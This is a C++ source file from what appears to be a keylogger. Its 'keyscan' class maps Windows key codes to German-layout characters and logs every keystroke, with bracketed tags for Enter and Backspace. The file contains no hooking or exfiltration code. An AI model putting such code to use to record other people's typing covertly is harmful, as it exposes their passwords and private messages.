#include "pch.h"
#include "keyscan.h"

bool keyscan::functional(const int& keycode) {
	switch (keycode) {
	//functional keys
	case VK_RETURN:
		m_logger->log(L"[return/enter]");
		return true;
	case VK_BACK:
		m_logger->log(L"[backspace]");
		return true;
	case VK_SHIFT:
		return true;
	case VK_MENU:
		return true;
	default: return false;
	}
}

void keyscan::mless(const int& keycode) {
	switch (keycode) {
	//special characters
	case VK_OEM_1:
		m_logger->log(L'ü'); break;
	case VK_OEM_2:
		m_logger->log(L'#'); break;
	case VK_OEM_3:
		m_logger->log(L'ö'); break;
	case VK_OEM_4:
		m_logger->log(L'ß'); break;
	case VK_OEM_5:
		m_logger->log(L'^'); break;
	case VK_OEM_6:
		m_logger->log(L'´'); break;
	case VK_OEM_7:
		m_logger->log(L'ä'); break;
	case VK_OEM_PERIOD:
		m_logger->log(L'.'); break;
	case VK_OEM_MINUS:
		m_logger->log(L'-'); break;
	case VK_OEM_COMMA:
		m_logger->log(L','); break;
	case VK_OEM_PLUS:
		m_logger->log(L'+'); break;
	case VK_OEM_102:
		m_logger->log(L'<'); break;
	}
	//simple alphabet
	if (keycode > 64 && keycode < 91)
		m_logger->log(wchar_t(keycode + 32));
	//numbers
	if (keycode > 47 && keycode < 58)
		m_logger->log(wchar_t(keycode));
}

void keyscan::shift(const int& keycode) {
	switch (keycode) {
	//number keys
	case 0x30:
		m_logger->log(L'='); break;
	case 0x31:
		m_logger->log(L'!'); break;
	case 0x32:
		m_logger->log(L'\"'); break;
	case 0x33:
		m_logger->log(L'§'); break;
	case 0x34:
		m_logger->log(L'$'); break;
	case 0x35:
		m_logger->log(L'%'); break;
	case 0x36:
		m_logger->log(L'&'); break;
	case 0x37:
		m_logger->log(L'/'); break;
	case 0x38:
		m_logger->log(L'('); break;
	case 0x39:
		m_logger->log(L')'); break;
	//special characters
	case VK_OEM_1:
		m_logger->log(L'Ü'); break;
	case VK_OEM_2:
		m_logger->log(L'\''); break;
	case VK_OEM_3:
		m_logger->log(L'Ö'); break;
	case VK_OEM_4:
		m_logger->log(L'?'); break;
	case VK_OEM_5:
		m_logger->log(L'°'); break;
	case VK_OEM_6:
		m_logger->log(L'`'); break;
	case VK_OEM_7:
		m_logger->log(L'Ä'); break;
	case VK_OEM_PERIOD:
		m_logger->log(L':'); break;
	case VK_OEM_MINUS:
		m_logger->log(L'_'); break;
	case VK_OEM_COMMA:
		m_logger->log(L';'); break;
	case VK_OEM_PLUS:
		m_logger->log(L'*'); break;
	case VK_OEM_102:
		m_logger->log(L'>'); break;
	}
	//simple alphabet
	if (keycode > 64 && keycode < 91)
		m_logger->log(wchar_t(keycode));
}

void keyscan::altgr(const int& keycode) {
	switch (keycode) {
	//special german-specific functions for "q" and "e" keys
	case 69:
		m_logger->log(L'€'); break;
	case 81:
		m_logger->log(L'@'); break;
	case 0x30:
		m_logger->log(L'}'); break;
	case 0x32:
		m_logger->log(L'²'); break;
	case 0x33:
		m_logger->log(L'³'); break;
	case 0x37:
		m_logger->log(L'{'); break;
	case 0x38:
		m_logger->log(L'['); break;
	case 0x39:
		m_logger->log(L']'); break;
	case VK_OEM_4:
		m_logger->log(L'\\'); break;
	case VK_OEM_PLUS:
		m_logger->log(L'~'); break;
	case VK_OEM_102:
		m_logger->log(L'|'); break;
	}
}